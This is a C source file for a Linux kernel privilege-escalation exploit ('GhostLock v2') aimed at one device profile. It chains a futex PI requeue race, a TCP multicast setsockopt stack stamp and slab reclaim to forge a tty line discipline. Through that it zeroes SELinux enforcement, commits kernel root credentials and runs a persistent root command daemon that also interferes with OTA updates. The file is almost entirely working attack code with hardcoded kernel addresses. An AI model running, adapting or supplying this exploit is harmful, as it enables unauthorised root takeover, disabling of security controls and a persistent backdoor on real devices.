/*
 * Corrected kara GhostLock assembly.
 *
 * The original implementation is included under v1-only symbol names so its
 * preflight, root daemon, OTA containment, and command protocol stay shared.
 * The live path below replaces the empty tty_ldiscs-overlap lock with the
 * tested mm-slab reclaim anchor and replaces select() with the exact TCP MCAST
 * full-waiter stamp.
 */
#define owner_thread kara_v1_owner_thread
#define waiter_thread kara_v1_waiter_thread
#define consumer_thread kara_v1_consumer_thread
#define run_live kara_v1_run_live
#define usage kara_v1_usage
#define main kara_v1_main
#include "kara_ghostlock.c"
#undef main
#undef usage
#undef run_live
#undef consumer_thread
#undef waiter_thread
#undef owner_thread

#include "kara_reclaim_engine.h"
#include "kara_reclaim_layout.h"

#include <netinet/in.h>

#ifndef MCAST_JOIN_SOURCE_GROUP
#define MCAST_JOIN_SOURCE_GROUP 46
#endif

#define KARA_V2_CONFIRMATION "RUN-KARA-PS7713-GHOSTLOCK-V2"

static int g_v2_stamp_socket = -1;
static struct kara_reclaim_hold g_v2_reclaim;

_Static_assert(KARA_LDISC_TARGET == 0xc14aba44u,
               "kara tty_ldiscs slot address changed");
_Static_assert(KARA_MCAST_TO_WAITER == 0x30u,
               "kara TCP MCAST stack geometry changed");

static int v2_profile_consistent(void)
{
    return KARA_INIT_TASK == KARA_PS7713_PROFILE.init_task &&
           KARA_PS7713_PROFILE.prepare_kernel_cred == 0xc01524d0u &&
           KARA_LDISC_CALL_GADGET == KARA_PS7713_PROFILE.ldisc_dispatch &&
           KARA_TTY_LDISCS == KARA_PS7713_PROFILE.tty_ldiscs &&
           KARA_LDISC_SLOT == (unsigned)KARA_PS7713_PROFILE.ldisc_slot &&
           KARA_MCAST_COPY_DEPTH == 0x218u &&
           KARA_WAITER_DEPTH == 0x1e8u;
}

static int prepare_tcp_stamp_socket(void)
{
    g_v2_stamp_socket = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
    return g_v2_stamp_socket >= 0;
}

static int probe_tcp_mcast_copy_path(void)
{
    uint8_t buffer[KARA_MCAST_COPY_SIZE] = {0};
    int fd = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (fd < 0)
        return 0;
    errno = 0;
    int result = setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                            buffer, sizeof(buffer));
    int saved_errno = errno;
    close(fd);
    klog("v2 TCP MCAST probe ret=%d errno=%d", result, saved_errno);

    /* Exact post-copy address-validation result on the target kernel. */
    return kara_tcp_mcast_copy_confirmed(result, saved_errno);
}

static void *v2_owner_thread(void *unused)
{
    (void)unused;
    pin_cpu(1);
    errno = 0;
    if (raw_futex(&g_f_target, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0,
                  NULL, NULL, 0) != 0) {
        klog("v2 owner: target LOCK_PI failed errno=%d", errno);
        return NULL;
    }
    while (!atomic_load(&g_waiter_ready))
        usleep(500);
    atomic_store(&g_owner_started, 1);
    (void)raw_futex(&g_f_chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0,
                    NULL, NULL, 0);
    spin_forever();
    return NULL;
}

static void *v2_waiter_thread(void *unused)
{
    (void)unused;
    pin_cpu(2);
    atomic_store(&g_waiter_tid, (int)syscall(KARA_NR_GETTID));
    errno = 0;
    int current_nice = getpriority(PRIO_PROCESS, 0);
    if (current_nice == -1 && errno != 0) {
        klog("v2 waiter: getpriority failed errno=%d", errno);
        return NULL;
    }
    atomic_store(&g_waiter_nice, current_nice);
    errno = 0;
    if (raw_futex(&g_f_chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0,
                  NULL, NULL, 0) != 0) {
        klog("v2 waiter: chain LOCK_PI failed errno=%d", errno);
        return NULL;
    }
    atomic_store(&g_waiter_ready, 1);
    while (!atomic_load(&g_owner_started))
        usleep(500);

    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    struct kara_old_timespec32 timeout = {
        .tv_sec = (int32_t)now.tv_sec + 5,
        .tv_nsec = (int32_t)now.tv_nsec,
    };
    atomic_store(&g_waiter_waiting, 1);
    errno = 0;
    long result = raw_futex(&g_f_wait,
                            FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                            0, &timeout, &g_f_target, 0);
    atomic_store(&g_waiter_errno, errno);
    atomic_store(&g_waiter_ret, (int)result);

    (void)raw_futex(&g_f_chain, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG,
                    0, NULL, NULL, 0);
    while (!atomic_load(&g_go_stamp))
        atomic_signal_fence(memory_order_seq_cst);

    uint8_t stamp[KARA_MCAST_COPY_SIZE];
    kara_build_tcp_stamp(stamp, &g_v2_reclaim.addresses);
    errno = 0;
    result = setsockopt(g_v2_stamp_socket, IPPROTO_IPV6,
                        MCAST_JOIN_SOURCE_GROUP, stamp, sizeof(stamp));
    atomic_store(&g_stamp_errno, errno);
    atomic_store(&g_stamp_ret, (int)result);
    atomic_store(&g_stamped, 1);
    spin_forever();
    return NULL;
}

static void *v2_consumer_thread(void *unused)
{
    (void)unused;
    pin_cpu(3);
    while (!atomic_load(&g_stamped))
        atomic_signal_fence(memory_order_seq_cst);

    struct kara_sched_attr attr;
    kara_build_nonpreempting_sched_attr(&attr,
                                        atomic_load(&g_waiter_nice));
    errno = 0;
    long result = syscall(KARA_NR_SCHED_SETATTR,
                          atomic_load(&g_waiter_tid), &attr, 0);
    atomic_store(&g_consumer_errno, errno);
    atomic_store(&g_consumer_ret, (int)result);
    atomic_store(&g_consumer_done, 1);
    for (;;)
        pause();
    return NULL;
}

static void reset_v2_state(void)
{
    g_f_wait = g_f_target = g_f_chain = 0;
    atomic_store(&g_waiter_tid, 0);
    atomic_store(&g_waiter_nice, 0);
    atomic_store(&g_waiter_ready, 0);
    atomic_store(&g_waiter_waiting, 0);
    atomic_store(&g_owner_started, 0);
    atomic_store(&g_go_stamp, 0);
    atomic_store(&g_stamped, 0);
    atomic_store(&g_consumer_done, 0);
    atomic_store(&g_waiter_ret, 0);
    atomic_store(&g_waiter_errno, 0);
    atomic_store(&g_stamp_ret, 0);
    atomic_store(&g_stamp_errno, 0);
    atomic_store(&g_consumer_ret, 0);
    atomic_store(&g_consumer_errno, 0);
}

static int restore_ldisc_global(void)
{
    errno = 0;
    int zero_result = ioctl(g_pty_master, KARA_PS7713_PROFILE.zero_word,
                            KARA_LDISC_TARGET);
    int zero_errno = errno;
    int n_tty = 0;
    errno = 0;
    int restore_result = ioctl(g_pty_master, TIOCSETD, &n_tty);
    int restore_errno = errno;
    klog("v2 ldisc cleanup zero-slot ret=%d errno=%d restore-N_TTY ret=%d errno=%d",
         zero_result, zero_errno, restore_result, restore_errno);
    return zero_result == 0 && restore_result == 0;
}

static int run_probe_v2(void)
{
    int base = run_probe();
    int profile = v2_profile_consistent();
    int tcp = probe_tcp_mcast_copy_path();
    klog("v2 probe profile=%s tcp_mcast=%s geometry copy=%#x waiter=%#x delta=%#x",
         profile ? "ok" : "FAIL", tcp ? "ok" : "FAIL",
         KARA_MCAST_COPY_DEPTH, KARA_WAITER_DEPTH, KARA_MCAST_TO_WAITER);
    if (base || !profile || !tcp)
        return 2;
    klog("V2 SAFE PROBE PASS (reclaim and GhostLock were not invoked)");
    return 0;
}

static int run_live_v2(void)
{
    enum kara_phase phase = KARA_PHASE_NEW;
    struct kara_preflight observed;
    uint32_t missing = observe_preflight(&observed);
    if (missing || !v2_profile_consistent()) {
        fprintf(stderr, "v2 preflight failed missing=%#x profile=%d\n",
                missing, v2_profile_consistent());
        return 2;
    }
    if (!probe_futex_pi() || !probe_pty_ldisc() ||
        !probe_tcp_mcast_copy_path()) {
        fprintf(stderr, "v2 capability gate failed before reclaim/race\n");
        return 2;
    }
    require_phase(&phase, KARA_PHASE_PREFLIGHT_OK);

    int detached = daemonize_live();
    if (detached != 0)
        return detached < 0 ? 2 : 0;
    klog("V2 LIVE START profile=kara/PS7713-5443 corrected-anchor confirmation accepted");

    if (!kara_reclaim_prepare(&g_v2_reclaim)) {
        klog("v2 reclaim preparation failed before vulnerable call");
        return 2;
    }
    klog("v2 reclaim retained mm=%08x page=%08x lock=%08x ldisc=%08x sent=%u/%u",
         g_v2_reclaim.leaked_mm, g_v2_reclaim.page_base,
         g_v2_reclaim.addresses.fake_lock,
         g_v2_reclaim.addresses.fake_ldisc,
         g_v2_reclaim.sent_count, g_v2_reclaim.socket_count);

    if (!open_private_pty(&g_pty_master, &g_pty_slave) ||
        !prepare_tcp_stamp_socket()) {
        klog("v2 live setup failed before race errno=%d", errno);
        kara_reclaim_release(&g_v2_reclaim);
        return 2;
    }
    reset_v2_state();
    require_phase(&phase, KARA_PHASE_FDS_READY);

    pthread_t waiter;
    pthread_t owner;
    pthread_t consumer;
    if (pthread_create(&waiter, NULL, v2_waiter_thread, NULL) != 0 ||
        pthread_create(&owner, NULL, v2_owner_thread, NULL) != 0 ||
        pthread_create(&consumer, NULL, v2_consumer_thread, NULL) != 0) {
        klog("v2 thread creation failed before race");
        return 2;
    }
    if (!wait_flag(&g_waiter_waiting, 3) ||
        !wait_flag(&g_owner_started, 3)) {
        klog("v2 race setup timed out before vulnerable call");
        return 2;
    }
    usleep(200000);
    errno = 0;
    long cmp_result = raw_futex(&g_f_wait,
                                FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                                1, (void *)(uintptr_t)1, &g_f_target, 0);
    int cmp_errno = errno;
    klog("v2 CMP_REQUEUE_PI ret=%ld errno=%d", cmp_result, cmp_errno);
    if (cmp_result != -1 || cmp_errno != EDEADLK)
        park_after_race("v2 expected EDEADLK not observed");
    require_phase(&phase, KARA_PHASE_RACE_OPEN);

    atomic_store(&g_go_stamp, 1);
    if (!wait_flag(&g_stamped, 10))
        park_after_race("v2 waiter did not finish TCP MCAST stamp");
    klog("v2 waiter ret=%d errno=%d MCAST ret=%d errno=%d",
         atomic_load(&g_waiter_ret), atomic_load(&g_waiter_errno),
         atomic_load(&g_stamp_ret), atomic_load(&g_stamp_errno));
    if (!kara_tcp_mcast_copy_confirmed(atomic_load(&g_stamp_ret),
                                       atomic_load(&g_stamp_errno)))
        park_after_race("v2 exact TCP MCAST post-copy result not observed");
    require_phase(&phase, KARA_PHASE_STACK_STAMPED);

    if (!wait_flag(&g_consumer_done, 5))
        park_after_race("v2 sched_setattr chain walk timed out");
    klog("v2 sched_setattr ret=%d errno=%d",
         atomic_load(&g_consumer_ret), atomic_load(&g_consumer_errno));
    if (atomic_load(&g_consumer_ret) != 0)
        park_after_race("v2 sched_setattr chain walk failed");
    require_phase(&phase, KARA_PHASE_POINTER_WRITTEN);

    unsigned mutated_pair = 0;
    unsigned mutated_offset = 0;
    errno = 0;
    int mutation = kara_reclaim_find_payload_mutation(
        &g_v2_reclaim, &mutated_pair, &mutated_offset);
    int mutation_errno = errno;
    klog("v2 reclaim readback mutation=%d pair=%u offset=%#x errno=%d",
         mutation, mutated_pair, mutated_offset, mutation_errno);
    if (mutation != 1)
        park_after_race("v2 forged reclaim page was not touched by chain walk");

    int disc = KARA_LDISC_SLOT;
    errno = 0;
    int ldisc_result = ioctl(g_pty_master, TIOCSETD, &disc);
    klog("v2 master TIOCSETD(%d) ret=%d errno=%d",
         disc, ldisc_result, errno);
    if (ldisc_result != 0)
        park_after_race("v2 fake line discipline did not bind");
    require_phase(&phase, KARA_PHASE_LDISC_BOUND);

    errno = 0;
    int zero_result = ioctl(g_pty_master, KARA_PS7713_PROFILE.zero_word,
                            KARA_PS7713_PROFILE.selinux_enforcing);
    char enforce[16] = "?";
    (void)read_text_file("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
    klog("v2 zero enforcing ret=%d errno=%d enforce=%s",
         zero_result, errno, enforce);
    if (zero_result != 0 || strcmp(enforce, "0") != 0)
        park_after_race("v2 SELinux enforcement zero-write was not verified");
    require_phase(&phase, KARA_PHASE_PERMISSIVE);

    errno = 0;
    int prepare_result = ioctl(g_pty_master,
                               KARA_PS7713_PROFILE.prepare_kernel_cred, 0);
    int prepare_errno = errno;
    uint32_t new_cred = 0;
    int cred_pointer_ok = kara_kernel_pointer_result(prepare_result, &new_cred);
    klog("v2 prepare_kernel_cred ret=%#x errno=%d pointer_ok=%d",
         (uint32_t)prepare_result, prepare_errno, cred_pointer_ok);
    if (!cred_pointer_ok)
        park_after_race("v2 prepare_kernel_cred did not return a kernel pointer");

    errno = 0;
    int cred_result = ioctl(g_pty_master, KARA_PS7713_PROFILE.commit_creds,
                            new_cred);
    klog("v2 commit_creds ret=%d errno=%d uid=%u euid=%u",
         cred_result, errno, (unsigned)getuid(), (unsigned)geteuid());
    if (cred_result != 0 || getuid() != 0 || geteuid() != 0)
        park_after_race("v2 root credentials were not verified");
    require_phase(&phase, KARA_PHASE_ROOT);
    (void)write_root_proof();

    if (!restore_ldisc_global())
        klog("WARNING: v2 retained fake ldisc globally; reclaim remains pinned");

    if (!contain_ota()) {
        klog("WARNING: v2 root succeeded but OTA containment did not fully verify; "
             "retaining root daemon for manual repair");
        root_command_daemon();
    }
    require_phase(&phase, KARA_PHASE_OTA_CONTAINED);
    (void)write_root_proof();
    require_phase(&phase, KARA_PHASE_DAEMON_READY);
    root_command_daemon();
    return 0;
}

static void usage_v2(const char *program)
{
    fprintf(stderr,
            "usage:\n"
            "  %s --probe\n"
            "  %s --live %s\n"
            "  %s --cmd 'command'\n",
            program, program, KARA_V2_CONFIRMATION, program);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    if (argc == 2 && !strcmp(argv[1], "--probe"))
        return run_probe_v2();
    if (argc == 3 && !strcmp(argv[1], "--cmd"))
        return command_client(argv[2]);
    if (argc == 3 && !strcmp(argv[1], "--live")) {
        if (strcmp(argv[2], KARA_V2_CONFIRMATION)) {
            fprintf(stderr, "v2 live confirmation token rejected\n");
            return 2;
        }
        return run_live_v2();
    }
    usage_v2(argv[0]);
    return 2;
}
